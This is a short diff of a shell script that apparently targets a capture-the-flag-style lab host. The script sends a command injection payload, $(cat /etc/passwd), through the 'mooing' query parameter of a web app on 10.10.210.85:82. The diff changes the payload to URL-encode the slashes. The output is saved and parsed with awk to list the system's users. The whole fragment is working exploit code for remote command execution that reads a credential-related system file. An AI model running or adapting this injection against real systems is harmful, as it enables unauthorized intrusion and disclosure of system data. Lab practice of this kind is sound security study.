@@ -19,5 +19,5 @@ echo "--> Files are : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 { 
 
 # Listing users
 echo "2 - LISTING USERS"
-curl -s -X GET "http://10.10.210.85:82/?cow=default&mooing=%24%28cat /etc/passwd%29" > /work/passwd.html
+curl -s -X GET "http://10.10.210.85:82/?cow=default&mooing=%24%28cat %2Fetc%2Fpasswd%29" > /work/passwd.html
 echo "--> Users are : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 { print }' /work/passwd.html)"
